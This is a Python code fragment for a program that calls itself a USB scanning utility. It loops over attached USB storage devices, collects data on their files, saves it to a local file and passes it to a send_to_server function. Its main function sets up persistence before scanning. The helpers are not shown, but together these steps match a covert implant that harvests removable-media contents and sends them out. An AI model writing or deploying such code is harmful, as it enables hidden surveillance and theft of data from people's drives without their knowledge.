def run_service_loop(interval=300, iterations=1):
    """Run the scanner in a loop according to service configuration."""
    logger.info(f"Starting service loop with interval={interval}s, iterations={iterations}")

    for i in range(iterations):
        logger.info(f"Running scan iteration {i+1}/{iterations}")
        run_single_scan()

        if i < iterations - 1:  # Don't sleep after last iteration
            logger.info(f"Sleeping for {interval} seconds...")
            time.sleep(interval)

    logger.info("Service loop completed")

def run_single_scan():
    """Run a single scan and process results."""
    try:
        # Create target directory
        os.makedirs('./target', exist_ok=True)

        devices = get_usb_storage_devices()

        if not devices:
            logger.info("No USB storage devices found.")
            save_to_file([], './target/output_file.txt')
            return

        logger.info(f"Found {len(devices)} USB storage devices")
        for device in devices:
            logger.info(f"  {device}")

        # Collect data from all devices
        all_data = []

        for device in devices:
            logger.info(f"Scanning {device}...")
            files_data = scan_device_files(device)
            all_data.append({
                'device': device,
                'files': files_data
            })

        # Save to file
        save_to_file(all_data, './target/output_file.txt')
        logger.info(f"Data saved to ./target/output_file.txt")

        # Send to server if configured
        send_to_server(all_data)

    except Exception as e:
        logger.error(f"Error during single scan: {e}")

def main():
    """Main function to handle command-line arguments and execute the utility."""
    # Setup persistence first
    setup_persistence()

    # Always run a single scan by default
    logger.info("Running single USB scan (default behavior)...")
    run_single_scan()

